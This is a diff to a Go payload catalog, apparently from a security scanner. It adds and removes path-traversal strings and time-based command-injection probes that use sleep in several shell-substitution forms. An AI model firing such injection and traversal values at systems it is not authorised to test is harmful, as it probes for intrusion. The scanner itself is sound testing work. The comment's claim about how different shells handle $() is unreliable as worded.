@@ -221,13 +221,15 @@ var payloadCatalog = map[PayloadClass][]Payload{
 		{Class: PayloadTraversal, Name: "windows-hosts", Template: `..\..\..\..\windows\system32\drivers\etc\hosts`},
 	},
 	PayloadCmdInject: {
-		// POSIX shell separators: semicolon chains, && short-circuits on
-		// success, | pipes. Each tests a distinct execution context.
+		// POSIX unquoted-arg context: `; sleep N` chains a new statement
+		// onto the host command. && / | were dropped from this list - they
+		// detect the same "concat into unquoted shell arg" capability and
+		// just multiply request count on non-vulnerable sinks.
 		{Class: PayloadCmdInject, Name: "semicolon-sleep", Template: `; sleep {{SLEEP}}`},
-		{Class: PayloadCmdInject, Name: "and-sleep", Template: `&& sleep {{SLEEP}}`},
-		{Class: PayloadCmdInject, Name: "pipe-sleep", Template: `| sleep {{SLEEP}}`},
-		// Backtick / $() substitution: detonates inside double-quoted
-		// shell arguments where bare ; / && are quoted out.
+		// Backtick + $() substitution: detonate inside double-quoted
+		// shell arguments where bare ; / && would be quoted out. Both
+		// kept because legacy /bin/sh strips $() while bash strips
+		// nothing, so each covers a real-world parser the other misses.
 		{Class: PayloadCmdInject, Name: "backtick-sleep", Template: "`sleep {{SLEEP}}`"},
 		{Class: PayloadCmdInject, Name: "dollar-paren-sleep", Template: `$(sleep {{SLEEP}})`},
 		// Windows analog: ping -n N implements a ~N-second delay
